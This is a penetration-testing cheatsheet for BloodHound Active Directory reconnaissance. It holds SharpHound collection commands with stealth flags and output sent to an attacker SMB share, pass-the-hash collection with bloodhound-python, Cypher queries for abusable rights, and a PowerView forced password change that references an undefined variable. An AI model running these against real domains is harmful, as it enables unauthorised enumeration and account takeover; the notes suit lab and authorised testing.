# BloodHound

#### Data collection

```shell
# Get all
SharpHound.exe -All

# DC Only
SharpHound.exe -DCOnly

# Computer only
SharpHound.exe -ComputerOnly

# Save to smbshare
sudo impacket-smbserver share ./ -smb2support -user zen -password zen
SharpHound.exe --memcache --outputdirectory \\10.10.11.10\share\ --zippassword ZenSharp --outputprefix ZEN --randomfilenames

# LDAP auth
SharpHound.exe -All --ldappassword zenpass --ldapusername zen
```

#### Other usefull flags

| Flag                | Description               |
| ------------------- | ------------------------- |
| `--randomfilenames` | Random files names output |
| `--outputdirectory` | Output directory          |
| `--zipfilename`     | Filename for zip          |
| `--zippassword`     | Password zip              |

#### Session loops

To see where users are connected we can use loops so SharpHound can find active sessions of users.

| Flag             | Description                     |
| ---------------- | ------------------------------- |
| `--loop`         | Loop computer collection        |
| `--loopduration` | Loop duration                   |
| `--loopinterval` | Sleep interval                  |
| `--stealth`      | Only check systems to have data |

```powershell
SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:01:00
```

#### Data collection from Linux

```bash
# Using hash
bloodhound-python -u 'admin' -p zen123 -d zencorp.local -ns 172.16.1.5 -c All

# Using hash
bloodhound-python -u 'admin' --hashes b18733e57ca3786565914d7136e0e79a -d zen.local -ns 172.16.1.5 -c All

# Using kerberos authentication
bloodhound-python -d zencorp.local -c DCOnly -u zen -p zen123 -ns 10.129.204.111 -k 
```

#### Queries

```shell
# Search user
MATCH (u:User {name:"JOE@ZENCORP.LOCAL"}) RETURN u
MATCH (u:User) WHERE u.name = "JOE@ZENCORP.LOCAL" RETURN u

# Get Group memberships
MATCH (u:User {name:"JOE@ZENCORP.LOCAL"})-[r:MemberOf]->(joeGroups) 
RETURN joeGroups

# MemberOf Relationship
MATCH p=((n:User {name:"JOE@ZENCORP.LOCAL"})-[r:MemberOf]->(g:Group)) 
RETURN p

# MemberOf Relationship depth 1..* (1 -any)
MATCH p=((u:User {name:"JOE@ZENCORP.LOCAL"})-[r:MemberOf*1..]->(g:Group)) 
RETURN p

# Find path group name Help Desk
MATCH p=(n:User)-[r1:MemberOf*1..]->(g:Group)
WHERE nodes(p)[1].name CONTAINS 'HELPDESK'
RETURN p

# Find path group name Help Desk using =~
MATCH p=(n:User)-[r1:MemberOf*1..]->(g:Group)
WHERE nodes(p)[1].name =~ '(?i)helpdesk.*'
RETURN p

# ShortestPath from node that contains john to any node
MATCH p = shortestPath((n)-[*1..]->(c)) 
WHERE n.name =~ '(?i)john.*' AND NOT c=n 
RETURN p

# Find rights domain user should not have
MATCH p=(g:Group)-[r:Owns|WriteDacl|GenericAll|WriteOwner|ExecuteDCOM|GenericWrite|AllowedToDelegate|ForceChangePassword]->(c:Computer) 
WHERE g.name STARTS WITH "DOMAIN USERS" 
RETURN p

# Find all users with desriptions
MATCH (u:User) 
WHERE u.description IS NOT NULL 
RETURN u.name,u.description

# Find WriteSPN
MATCH p=((n)-[r:WriteSPN]->(m)) RETURN p
```

#### Cheatsheets

[https://gist.github.com/jeffmcjunkin/7b4a67bb7dd0cfbfbd83768f3aa6eb12](https://gist.github.com/jeffmcjunkin/7b4a67bb7dd0cfbfbd83768f3aa6eb12)[https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

#### ForceChangePassword

```powershell
# Use powerview
Import-Module .\PowerView.ps1

# Save password
$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force

# Create PSCredential object
$Cred = New-Object System.Management.Automation.PSCredential('ZENCORP\john', $SecPassword)

# Change password
Set-DomainUserPassword -Identity steven -AccountPassword $UserPassword -Credential $Cred -Verbose
```
